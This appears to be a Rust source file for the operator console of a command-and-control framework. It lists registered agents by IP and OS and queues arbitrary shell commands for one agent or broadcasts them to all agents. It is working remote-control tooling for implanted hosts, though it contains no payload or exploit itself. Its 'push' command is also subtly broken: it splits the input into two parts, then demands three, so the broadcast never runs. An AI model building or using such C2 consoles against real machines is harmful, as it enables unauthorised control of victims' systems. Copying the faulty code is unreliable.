use crate::SharedState;
use std::time::SystemTime;
use rustyline::{error::ReadlineError, Editor};
use rustyline::history::FileHistory;
use talaria::protocol::*;
use crate::rocket::yansi::Paint;
use rustyline::history::History;

pub async fn start_console(shared_state: &SharedState) {
    println!("=============================================================================================================================================");
    println!(
        r#"
___________              __                                                                              .___                                  .__          
\__    ___/____ ________/  |______ _______ __ __  ______   ____  ____   _____   _____ _____    ____    __| _/   ____  ____   ____   __________ |  |   ____  
  |    |  \__  \\_  __ \   __\__  \\_  __ \  |  \/  ___/ _/ ___\/  _ \ /     \ /     \\__  \  /    \  / __ |  _/ ___\/  _ \ /    \ /  ___/  _ \|  | _/ __ \ 
  |    |   / __ \|  | \/|  |  / __ \|  | \/  |  /\___ \  \  \__(  <_> )  Y Y  \  Y Y  \/ __ \|   |  \/ /_/ |  \  \__(  <_> )   |  \\___ (  <_> )  |_\  ___/ 
  |____|  (____  /__|   |__| (____  /__|  |____//____  >  \___  >____/|__|_|  /__|_|  (____  /___|  /\____ |   \___  >____/|___|  /____  >____/|____/\___  >
               \/                 \/                 \/       \/            \/      \/     \/     \/      \/       \/           \/     \/                \/       
        "#
    );
    println!("=============================================================================================================================================");
    println!("Type 'help' for a list of commands.\n");



    let mut rl = Editor::<(), FileHistory>::new().unwrap();

    // Load command history if it exists
    if rl.load_history("history.txt").is_err() {
        println!("No previous history.");
    }

    loop {
        let readline = rl.readline("tartarus> ");
        match readline {
            Ok(line) => {
                rl.add_history_entry(line.as_str());
                let command = line.trim();

                match command {
                    "status" => show_status(shared_state).await,
                    "history" => show_history(&rl).await,
                    "list agents" => list_agents(shared_state).await,
                    cmd if cmd.starts_with("exec ") => {
                        let parts: Vec<&str> = cmd.splitn(3, ' ').collect();
                        if parts.len() < 3 {
                            println!("Usage: exec <agent_id> <command>");
                        } else {
                            let agent_id: u64 = parts[1].parse().unwrap_or(0);
                            let command = parts[2];
                            execute_command(shared_state, agent_id, command).await;
                        }
                    }
                    cmd if cmd.starts_with("push ") => {
                        let parts: Vec<&str> = cmd.splitn(2, ' ').collect();
                        if parts.len() < 3 {
                            println!("Usage: push <command>");
                        } else {
                            let command = parts[1];
                            push_command(shared_state, command).await;
                        }
                    }
                    "exit" => {
                        println!("Exiting Tartarus Console.");
                        break;
                    }
                    "help" => show_help(),
                    _ => println!("Unknown command. Type 'help' for a list of commands."),
                }
            }
            Err(ReadlineError::Interrupted) => {
                println!("CTRL-C detected. Exiting.");
                break;
            }
            Err(ReadlineError::Eof) => {
                println!("CTRL-D detected. Exiting.");
                break;
            }
            Err(err) => {
                println!("Error: {:?}", err);
                break;
            }
        }
    }

    // Save command history
    rl.save_history("history.txt").unwrap_or_else(|err| {
        eprintln!("Failed to save history: {:?}", err);
    });
}

fn show_help() {
    println!("Available commands:");
    println!("  status       - Show the status of all active listeners");
    println!("  history      - Show the current history of run commands");
    println!("  list agents  - List all registered agents");
    println!("  push         - Execute a command to every agent");
    println!("  exec         - Execute a command on a specific agent (Usage: exec <agent_id> <command>)");
    println!("  exit         - Exit the Tartarus Console");
    println!("  help         - Show this help message");
}

async fn execute_command(shared_state: &SharedState, agent_id: u64, command: &str) {
    let mut state = shared_state.write().await;

    if let Some(agent) = state.agents.iter_mut().find(|a| a.id == agent_id) {
        println!("Executing command '{}' on Agent {}...", command, agent_id);

        let instruction = AgentInstruction {
            packet_header: PacketHeader {
                agent_id,
                timestamp: current_time(),
                packet_id: 0, // TODO: Generate a unique packet ID
                os: None,
            },
            instruction: AgentInstructionBody::Command {
                command_id: 0, // TODO: Replace with unique ID generation logic
                command: command.into(),
                args: vec![],
            },
        };

        agent.instruction_history.push(instruction);
        println!("Command sent successfully.");
    } else {
        println!("Agent with ID {} not found.", agent_id);
    }
}

async fn push_command(shared_state: &SharedState, command: &str) {
    let mut state = shared_state.write().await;
    //iterate through every agent to execute commands

    for agent in &mut state.agents {
        println!("Executing command '{}' on Agents...", command);

        let instruction = AgentInstruction {
            packet_header: PacketHeader {
                agent_id: agent.id,
                timestamp: current_time(),
                packet_id: 0, // TODO: Generate a unique packet ID
                os: None,
            },
            instruction: AgentInstructionBody::Command {
                command_id: 0, // TODO: Replace with unique ID generation logic
                command: command.into(),
                args: vec![],
            },
        };

        agent.instruction_history.push(instruction);
        println!("Command sent successfully to all agents.");
}
}

async fn show_status(shared_state: &SharedState) {
    let listeners = shared_state.read().await;

    if listeners.listeners.is_empty() {
        println!("No active listeners.");
    } else {
        println!("Active listeners:");
        for listener in listeners.listeners.iter() {
            println!("  - {}", listener);
        }
    }
}

pub async fn show_history(rl: &Editor<(), FileHistory>) {
    let history = rl.history();
    if history.len() == 0 {
        println!("No active history.");
    } else {
        println!("History:");
        for entry in history.iter() {
            println!("  - {}", entry);
        }
    }
}
async fn list_agents(shared_state: &SharedState) {
    let agents = shared_state.read().await.agents.clone();

    if agents.is_empty() {
        println!("No registered agents.");
    } else {
        println!("Registered agents:");
        for agent in agents {
            println!(
                "  - ID: {}, OS: {:?}, IP: {}, Last Response: {}s ago",
                agent.id,
                agent.os,
                agent.ip,
                current_time() - agent.last_response_recv
            );
        }
    }
}

fn current_time() -> u64 {
    SystemTime::now()
        .duration_since(SystemTime::UNIX_EPOCH)
        .unwrap()
        .as_secs()
}
